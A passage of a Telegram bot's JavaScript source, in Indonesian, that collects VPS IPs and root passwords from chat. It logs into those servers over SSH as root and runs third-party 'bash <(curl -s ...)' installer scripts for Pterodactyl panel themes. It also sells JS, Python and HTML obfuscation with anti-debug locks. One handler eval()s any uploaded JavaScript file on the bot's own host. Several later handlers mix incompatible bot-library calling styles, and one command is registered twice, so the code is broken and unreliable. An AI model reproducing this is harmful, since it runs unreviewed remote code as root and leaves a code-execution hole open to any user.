    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "installnebula");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args || !args.includes("|")) {
        return ctx.reply("<blockquote>❌ <b>Format:</b> /installnebula ip|password</blockquote>", { parse_mode: "HTML" });
    }

    const [ipvps, passwd] = args.split("|").map(v => v.trim());
    const conn = new Client();

    try {
        await ctx.reply(`<blockquote>🌀 <b>Proses Install Tema Nebula</b>\n📡 IP: ${ipvps}\n⏳ Tunggu...</blockquote>`, { parse_mode: "HTML" });

        conn.on("ready", () => {
            conn.exec("bash <(curl -s https://raw.githubusercontent.com/Bangsano/themeinstaller/refs/heads/main/install.sh)", (err, stream) => {
                if (err) {
                    conn.end();
                    return ctx.reply(`<blockquote>❌ Error: ${err.message}</blockquote>`, { parse_mode: "HTML" });
                }

                stream.on("data", (data) => {
                    const str = data.toString();
                    if (str.includes("pilihan") || str.includes("option")) {
                        stream.write("1\n");
                        stream.write("10\n");
                        stream.write("y\n");
                        stream.write("\n\n");
                        stream.write("x\n");
                    }
                });

                stream.on("close", () => {
                    ctx.reply("<blockquote>✅ <b>Berhasil install tema Nebula!</b></blockquote>", { parse_mode: "HTML" });
                    conn.end();
                });
            });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: passwd,
            readyTimeout: 20000
        });

    } catch (e) {
        ctx.reply(`<blockquote>❌ Error: ${e.message}</blockquote>`, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Install Frostcore ] ------------------------ \\
bot.command("installfrostcore", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "installfrostcore");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args || !args.includes("|")) {
        return ctx.reply("<blockquote>❌ <b>Format:</b> /installfrostcore ip|password</blockquote>", { parse_mode: "HTML" });
    }

    const [ipvps, passwd] = args.split("|").map(v => v.trim());
    const conn = new Client();

    try {
        await ctx.reply(`<blockquote>🌀 <b>Proses Install Tema Frostcore</b>\n📡 IP: ${ipvps}\n⏳ Tunggu...</blockquote>`, { parse_mode: "HTML" });

        conn.on("ready", () => {
            conn.exec("bash <(curl -s https://raw.githubusercontent.com/Bangsano/themeinstaller/refs/heads/main/install.sh)", (err, stream) => {
                if (err) {
                    conn.end();
                    return ctx.reply(`<blockquote>❌ Error: ${err.message}</blockquote>`, { parse_mode: "HTML" });
                }

                stream.on("data", (data) => {
                    const str = data.toString();
                    if (str.includes("pilihan") || str.includes("option")) {
                        stream.write("1\n");
                        stream.write("6\n");
                        stream.write("y\n");
                        stream.write("x\n");
                    }
                });

                stream.on("close", () => {
                    ctx.reply("<blockquote>✅ <b>Berhasil install tema Frostcore!</b></blockquote>", { parse_mode: "HTML" });
                    conn.end();
                });
            });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: passwd,
            readyTimeout: 20000
        });

    } catch (e) {
        ctx.reply(`<blockquote>❌ Error: ${e.message}</blockquote>`, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Install Noobe ] ------------------------ \\
bot.command("installnoobe", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "installnoobe");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args || !args.includes("|")) {
        return ctx.reply("<blockquote>❌ <b>Format:</b> /installnoobe ip|password</blockquote>", { parse_mode: "HTML" });
    }

    const [ipvps, passwd] = args.split("|").map(v => v.trim());
    const conn = new Client();

    try {
        await ctx.reply(`<blockquote>🌀 <b>Proses Install Tema Noobe</b>\n📡 IP: ${ipvps}\n⏳ Tunggu...</blockquote>`, { parse_mode: "HTML" });

        conn.on("ready", () => {
            conn.exec("bash <(curl -s https://raw.githubusercontent.com/Bangsano/themeinstaller/refs/heads/main/install.sh)", (err, stream) => {
                if (err) {
                    conn.end();
                    return ctx.reply(`<blockquote>❌ Error: ${err.message}</blockquote>`, { parse_mode: "HTML" });
                }

                stream.on("data", (data) => {
                    const str = data.toString();
                    if (str.includes("pilihan") || str.includes("option")) {
                        stream.write("1\n");
                        stream.write("8\n");
                        stream.write("y\n");
                        stream.write("x\n");
                    }
                });

                stream.on("close", () => {
                    ctx.reply("<blockquote>✅ <b>Berhasil install tema Noobe!</b></blockquote>", { parse_mode: "HTML" });
                    conn.end();
                });
            });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: passwd,
            readyTimeout: 20000
        });

    } catch (e) {
        ctx.reply(`<blockquote>❌ Error: ${e.message}</blockquote>`, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Install Nightcore ] ------------------------ \\
bot.command("installnightcore", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "installnightcore");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args || !args.includes("|")) {
        return ctx.reply("<blockquote>❌ <b>Format:</b> /installnightcore ip|password</blockquote>", { parse_mode: "HTML" });
    }

    const [ipvps, passwd] = args.split("|").map(v => v.trim());
    const conn = new Client();

    try {
        await ctx.reply(`<blockquote>🌀 <b>Proses Install Tema Nightcore</b>\n📡 IP: ${ipvps}\n⏳ Tunggu...</blockquote>`, { parse_mode: "HTML" });

        conn.on("ready", () => {
            conn.exec("bash <(curl -s https://raw.githubusercontent.com/Bangsano/themeinstaller/refs/heads/main/install.sh)", (err, stream) => {
                if (err) {
                    conn.end();
                    return ctx.reply(`<blockquote>❌ Error: ${err.message}</blockquote>`, { parse_mode: "HTML" });
                }

                stream.on("data", (data) => {
                    const str = data.toString();
                    if (str.includes("pilihan") || str.includes("option")) {
                        stream.write("1\n");
                        stream.write("6\n");
                        stream.write("y\n");
                        stream.write("x\n");
                    }
                });

                stream.on("close", () => {
                    ctx.reply("<blockquote>✅ <b>Berhasil install tema Nightcore!</b></blockquote>", { parse_mode: "HTML" });
                    conn.end();
                });
            });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: passwd,
            readyTimeout: 20000
        });

    } catch (e) {
        ctx.reply(`<blockquote>❌ Error: ${e.message}</blockquote>`, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Install Billing ] ------------------------ \\
bot.command("installbilling", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "installbilling");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args || !args.includes("|")) {
        return ctx.reply("<blockquote>❌ <b>Format:</b> /installbilling ip|password</blockquote>", { parse_mode: "HTML" });
    }

    const [ipvps, passwd] = args.split("|").map(v => v.trim());
    const conn = new Client();

    try {
        await ctx.reply(`<blockquote>🌀 <b>Proses Install Tema Billing</b>\n📡 IP: ${ipvps}\n⏳ Tunggu...</blockquote>`, { parse_mode: "HTML" });

        conn.on("ready", () => {
            conn.exec("bash <(curl -s https://raw.githubusercontent.com/Bangsano/themeinstaller/refs/heads/main/install.sh)", (err, stream) => {
                if (err) {
                    conn.end();
                    return ctx.reply(`<blockquote>❌ Error: ${err.message}</blockquote>`, { parse_mode: "HTML" });
                }

                stream.on("data", (data) => {
                    const str = data.toString();
                    if (str.includes("pilihan") || str.includes("option")) {
                        stream.write("1\n");
                        stream.write("2\n");
                        stream.write("y\n");
                        stream.write("x\n");
                    }
                });

                stream.on("close", () => {
                    ctx.reply("<blockquote>✅ <b>Berhasil install tema Billing!</b></blockquote>", { parse_mode: "HTML" });
                    conn.end();
                });
            });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: passwd,
            readyTimeout: 20000
        });

    } catch (e) {
        ctx.reply(`<blockquote>❌ Error: ${e.message}</blockquote>`, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Install Wallpaper ] ------------------------ \\
bot.command("installwallpaper", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "installwallpaper");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args) {
        return ctx.reply("<blockquote>❌ <b>Format:</b> /installwallpaper ip|password|link</blockquote>", { parse_mode: "HTML" });
    }

    const parts = args.split("|").map(v => v.trim());
    if (parts.length < 2) {
        return ctx.reply("<blockquote>❌ <b>Format:</b> /installwallpaper ip|password|link</blockquote>", { parse_mode: "HTML" });
    }

    const [ipvps, passwd] = parts;
    const wallpaper = parts[2] || "https://files.catbox.moe/xdsoj7.jpg";
    const conn = new Client();

    try {
        await ctx.reply(`<blockquote>🌀 <b>Install Wallpaper</b>\n📡 IP: ${ipvps}\n🖼️: ${wallpaper}</blockquote>`, { parse_mode: "HTML" });

        conn.on("ready", () => {
            conn.exec("bash <(curl -s https://raw.githubusercontent.com/Bangsano/themeinstaller/refs/heads/main/install.sh)", (err, stream) => {
                if (err) {
                    conn.end();
                    return ctx.reply(`<blockquote>❌ Error: ${err.message}</blockquote>`, { parse_mode: "HTML" });
                }

                stream.on("data", () => {
                    stream.write("metrickpack2\n");
                    stream.write("4\n");
                    stream.write(`${wallpaper}\n`);
                    stream.write("23\n");
                });

                stream.on("close", () => {
                    ctx.reply("<blockquote>✅ <b>Wallpaper berhasil diinstall!</b></blockquote>", { parse_mode: "HTML" });
                    conn.end();
                });
            });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: passwd,
            readyTimeout: 20000
        });

    } catch (e) {
        ctx.reply(`<blockquote>❌ Error: ${e.message}</blockquote>`, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Uninstall Tema ] ------------------------ \\
bot.command(["uninstalltema", "uninstaltema", "uninstalltemaptero"], async (ctx) => {
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "uninstalltema");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const input = args.trim();
    
    if (!input) {
        return ctx.reply(
            `<blockquote>📘 <b>Cara Penggunaan:</b>\n\nGunakan format berikut untuk menghapus tema Pterodactyl:\n<code>/uninstalltema ip|password</code>\n\n🧩 <b>Contoh:</b>\n<code>/uninstalltema 1.2.3.4|root123</code>\n\n💡 Setelah dijalankan sekali, kamu bisa cukup ketik:\n<code>/uninstalltema</code>\nuntuk menggunakan data VPS terakhir yang tersimpan.</blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    if (!input.includes("|")) {
        return ctx.reply(
            `<blockquote>⚠️ Format salah!\nGunakan format: <code>/uninstalltema ip|password</code>\n\nContoh:\n<code>/uninstalltema 1.2.3.4|root123</code></blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    const parts = input.split("|");
    let ipvps = parts[0].trim();
    const passwd = parts[1].trim();

    if (!ipvps || !passwd) {
        return ctx.reply(
            `<blockquote>⚠️ IP atau Password tidak boleh kosong!</blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    let port = 22;
    if (ipvps.includes(":")) {
        const [host, portNum] = ipvps.split(":");
        ipvps = host;
        port = parseInt(portNum, 10) || 22;
    }

    const conn = new Client();
    const command = `bash <(curl -s https://raw.githubusercontent.com/Zero-Hiroo/Autoinstall-/refs/heads/main/bangkai.sh)`;

    try {
        await ctx.reply(
            `<blockquote>🌀 <b>Memproses uninstall tema Pterodactyl...</b>\n📡 IP: <code>${ipvps}:${port}</code>\n⏳ Tunggu 1–10 menit hingga proses selesai...</blockquote>`,
            { parse_mode: "HTML" }
        );

        let processCompleted = false;
        const timeout = setTimeout(() => {
            if (!processCompleted) {
                try { conn.end(); conn.destroy(); } catch(e) {}
                ctx.reply(
                    `<blockquote>⏱️ <b>Waktu koneksi habis!</b> Periksa VPS dan coba lagi.</blockquote>`,
                    { parse_mode: "HTML" }
                );
            }
        }, 600000); // 10 menit timeout

        conn.on("ready", () => {
            ctx.reply(
                `<blockquote>⚙️ <b>Koneksi berhasil!</b>\n🧹 Memulai proses uninstall tema...</blockquote>`,
                { parse_mode: "HTML" }
            );

            conn.exec(command, (err, stream) => {
                if (err) {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); conn.destroy(); } catch(e) {}
                    return ctx.reply(
                        `<blockquote>❌ <b>Gagal menjalankan script uninstall!</b>\n<code>${err.message}</code></blockquote>`,
                        { parse_mode: "HTML" }
                    );
                }

                let output = "";
                let errorOutput = "";

                stream.on("data", (data) => {
                    const str = data.toString();
                    output += str;
                    try {
                        if (str.includes("pilihan") || str.includes("option") || str.includes("select") || str.includes("Input")) {
                            stream.write("2\n"); // Pilih menu uninstall
                            stream.write("y\n"); // Konfirmasi
                            stream.write("x\n"); // Keluar
                        }
                    } catch (e) {
                        console.error("Error writing to stream:", e);
                    }
                    
                    console.log(`[${ipvps}] ${str}`);
                });

                stream.stderr.on("data", (data) => {
                    errorOutput += `[ERROR] ${data.toString()}`;
                });

                stream.on("close", (code, signal) => {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); conn.destroy(); } catch(e) {}

                    const resultMessage = `<blockquote>✅ <b>Berhasil uninstall tema Pterodactyl!</b>\n\n🎉 Tema telah berhasil dihapus dari VPS.\n🔄 Silakan refresh panel Anda.</blockquote>`;

                    ctx.reply(resultMessage, { parse_mode: "HTML" });
                    
                    if (errorOutput && errorOutput.trim().length > 0) {
                        const errorDisplay = errorOutput.slice(-1500) || "(tidak ada detail error)";
                        ctx.reply(
                            `<blockquote>📋 <b>Log Terakhir:</b>\n<code>${errorDisplay}</code></blockquote>`,
                            { parse_mode: "HTML" }
                        ).catch(() => {});
                    }
                });
            });
        });

        conn.on("error", (err) => {
            processCompleted = true;
            clearTimeout(timeout);
            try { conn.end(); conn.destroy(); } catch(e) {}
            
            let errorMessage = '<blockquote>❌ <b>Gagal terhubung ke VPS!</b>\n\nPeriksa:\n';
            errorMessage += '1. IP VPS benar\n';
            errorMessage += '2. Password root benar\n';
            errorMessage += '3. Port SSH terbuka\n';
            errorMessage += '4. VPS sedang aktif\n\n';
            errorMessage += `<b>Error detail:</b>\n<code>${err.message || 'Unknown error'}</code></blockquote>`;
            
            ctx.reply(errorMessage, { parse_mode: "HTML" });
        });

        conn.connect({
            host: ipvps,
            port: port,
            username: "root",
            password: passwd,
            readyTimeout: 20000,
        });
        
    } catch (e) {
        console.error("Error in /uninstalltema:", e);
        ctx.reply(
            `<blockquote>❌ <b>Terjadi kesalahan:</b>\n<code>${e.message}</code></blockquote>`,
            { parse_mode: "HTML" }
        );
    }
});

// -------------------- Command: encrypthtml --------------------
bot.command("encrypthtml", async (ctx) => {
    try {
        if (!await checkUserLimit(ctx, "encrypthtml")) return;

        const doc = validateFile(ctx, ['.html']);
        if (!doc) return;

        const loading = await ctx.reply("⏳ Memproses encrypt HTML...");
        const fileLink = await ctx.telegram.getFileLink(doc.file_id);
        const res = await fetch(fileLink.href);
        const html = await res.text();
        const encoded = Buffer.from(html).toString("base64");
        const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Encrypted HTML</title>
</head>
<body>
<script>
document.write(atob("${encoded}"));
</script>
</body>
</html>`;

        const { filePath, fileName } = createTempFile(encryptedHTML, 'encrypted', '.html');

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loading.message_id,
            null,
            "✅ Encrypt selesai!"
        );

        await ctx.replyWithDocument(
            { source: filePath, filename: fileName },
            { caption: "✅ Encryption Successful\n• Type: HTML\n\nBy @ReyValdz" }
        );

        cleanupTempFile(filePath);

    } catch (e) {
        console.error(chalk.red(`❌ Error encrypthtml: ${e.message}`));
        ctx.reply("❌ Gagal memproses file");
    }
});

// -------------------- Command: encryptpy --------------------
bot.command("encryptpy", async (ctx) => {
    try {
        if (!await checkUserLimit(ctx, "encryptpy")) return;

        const doc = validateFile(ctx, ['.py']);
        if (!doc) return;

        const loading = await ctx.reply("🔐 Encrypting python file...");
        const file = await ctx.telegram.getFile(doc.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

        const res = await axios.get(fileUrl, {
            responseType: "arraybuffer",
        });

        const original = res.data;

        // Gzip + Base64
        const compressed = zlib.gzipSync(original);
        const encoded = compressed.toString("base64");
        const encryptedCode = `# 🔐 Encrypted Python File
import base64, gzip, sys

_code = "${encoded}"

try:
    exec(
        gzip.decompress(
            base64.b64decode(_code)
        ).decode("utf-8")
    )
except Exception as e:
    print(f"Error executing encrypted code: {e}")
    sys.exit(1)
`;

        const outName = doc.file_name.replace(".py", "_enc.py");
        const { filePath } = createTempFile(encryptedCode, 'encrypted-py', '.py');

        await ctx.telegram.deleteMessage(ctx.chat.id, loading.message_id);

        await ctx.replyWithDocument(
            { source: filePath, filename: outName },
            { caption: "✅ Encryption Successful\n• Type: Python\n\nBy @ReyValdz" }
        );

        cleanupTempFile(filePath);

    } catch (err) {
        console.error(chalk.red(`❌ Error encryptpy: ${err.message}`));
        ctx.reply("⚠️ Gagal encrypt file python");
    }
});

// -------------------- Command: encinvis --------------------
bot.command("encinvis", async (ctx) => {
    try {
        if (!await checkUserLimit(ctx, "encinvis")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi...");

        const fileLink = await ctx.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Strong Obfuscation`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            {
                target: "node",
                calculator: true,
                compact: true,
                hexadecimalNumbers: true,
                controlFlowFlattening: 0.75,
                deadCode: 0.2,
                dispatcher: true,
                duplicateLiteralsRemoval: 0.75,
                flatten: true,
                globalConcealing: true,
                identifierGenerator: "zeroWidth",
                minify: true,
                movedDeclarations: true,
                objectExtraction: true,
                opaquePredicates: 0.75,
                renameVariables: true,
                renameGlobals: true,
                stringConcealing: true,
                stringCompression: true,
                stringEncoding: true,
                stringSplitting: 0.75,
                rgf: false,
            }
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'invisible-encrypted', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `invisible-encrypted-${doc.file_name}`,
            },
            {
                caption: "✅ Encryption Successful\n• Type: Invisible\n\nBy @ReyValdz",
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ Invisible obfuscation completed for ${ctx.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encinvis: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// -------------------- Command: encrypt --------------------
bot.command("encrypt", async (ctx) => {
    try {
        // Check Limit
        if (!await checkUserLimit(ctx, "encrypt")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        await ctx.reply("🔒 Memulai proses enkripsi Siu+Calcrick...");
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const fileLink = await ctx.telegram.getFileLink(doc.file_id);
        const response = await fetch(fileLink.href);
        let fileContent = await response.text();
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan gaya Siu+Calcrick`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            {
                target: "node",
                compact: true,
                renameVariables: true,
                renameGlobals: true,
                identifierGenerator: () => {
                    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                    let randomPart = "";
                    for (let i = 0; i < 6; i++) {
                        randomPart += chars[Math.floor(Math.random() * chars.length)];
                    }
                    return `Mbut和AldzyIsHere无与伦比的帅气${randomPart}`;
                },
                stringCompression: true,
                stringEncoding: true,
                stringSplitting: true,
                controlFlowFlattening: 0.95,
                shuffle: true,
                rgf: false,
                flatten: true,
                duplicateLiteralsRemoval: true,
                deadCode: true,
                calculator: true,
                opaquePredicates: true,
                lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true,
                },
            }
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'siucalcrick-encrypted', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `siucalcrick-encrypted-${doc.file_name}`,
            },
            {
                caption: "✅ Encryption Successful\n• Type: siucalcrick\n\nBy @ReyValdz",
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ Encrypt obfuscation completed for ${ctx.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encrypt: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// -------------------- Command: encchina --------------------
bot.command("encchina", async (ctx) => {
    try {
        console.log(`Perintah diterima: /encchina dari: ${ctx.from.username || ctx.from.id}`);

        // Check Limit
        if (!await checkUserLimit(ctx, "encchina")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        await ctx.reply("⚡️ Processing hard code encryption...");

        // Download 
        const fileLink = await ctx.telegram.getFileLink(doc.file_id);
        const response = await axios.get(fileLink.href, { responseType: "text" });
        let codeString = response.data;

        if (typeof codeString !== "string") {
            throw new Error("File bukan dalam format string yang valid.");
        }

        let obfuscatedCode = await JsConfuser.obfuscate(codeString, {
            target: "node",
            compact: true,
            controlFlowFlattening: 0.8,
            deadCode: 0.3,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.7,
            globalConcealing: true,
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.5,
            stringConcealing: true,
            stringCompression: true,
            opaquePredicates: 0.9,
            calculator: true,
            hexadecimalNumbers: true,
            shuffle: true,
            identifierGenerator: () => "高宝座AldzyIsHere齐高宝座Mbut齐高宝座" + Math.random().toString(36).substring(7),
        });

        if (typeof obfuscatedCode === 'object' && obfuscatedCode.code) {
            obfuscatedCode = obfuscatedCode.code;
        }

        if (typeof obfuscatedCode !== 'string') {
            throw new Error("Hasil enkripsi bukan dalam format string.");
        }

        const { filePath } = createTempFile(obfuscatedCode, 'encrypted-china', '.js');

        await ctx.replyWithDocument(
            { source: filePath, filename: `encrypted_${doc.file_name}` },
            { caption: `✅ Encryption Successful\n• Type: Hard Code\n\nBy @ReyValdz` }
        );

        cleanupTempFile(filePath);

    } catch (err) {
        console.error(chalk.red(`❌ Error encchina: ${err.message}`));
        await ctx.reply(`❌ An error occurred: ${err.message}`);
    }
});

// ========== COMMAND: ENC (LOW/MEDIUM/HIGH) ==========
bot.command(/^\/enc(?:\s+(low|medium|high))?$/i, async (msg, match) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "enc")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const level = match[1] || "high";
        const progressMessage = await ctx.reply(`🔒 Memulai proses enkripsi (${level})...`);

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan level ${level}`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getObfuscationConfig(level)
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, `enc-${level}`, '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `enc-${level}-${doc.file_name}`,
            },
            {
                caption: `✅ Encryption Successful\n• Level: ${level}\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ Enc (${level}) completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error enc: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCEVAL ==========
bot.command(/^\/enceval(?:\s+(low|medium|high))?$/i, async (msg, match) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "enceval")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const level = match[1] || "high";
        const progressMessage = await ctx.reply(`🔒 Memulai proses enkripsi dengan eval (${level})...`);

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Mengevaluasi kode: ${doc.file_name}`));
        
        let evalResult;
        try {
            evalResult = eval(fileContent);
            if (typeof evalResult === "function") evalResult = "Function detected";
            else if (evalResult === undefined) evalResult = "No return value";
            else evalResult = String(evalResult);
        } catch (evalError) {
            evalResult = `Evaluation error: ${evalError.message}`;
        }

        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan level ${level}`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getObfuscationConfig(level)
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await ctx.reply(`📊 *Hasil Evaluasi:*\n\`\`\`\n${evalResult}\n\`\`\``, { parse_mode: "Markdown" });

        const { filePath } = createTempFile(obfuscatedCode, `eval-enc-${level}`, '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `eval-enc-${level}-${doc.file_name}`,
            },
            {
                caption: `✅ Encryption with Eval Successful\n• Level: ${level}\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncEval (${level}) completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error enceval: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCCHINA ==========
bot.command(/^\/encchina$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encchina")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi China Style...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan China Style`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getMandarinObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'china-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `china-enc-${doc.file_name}`,
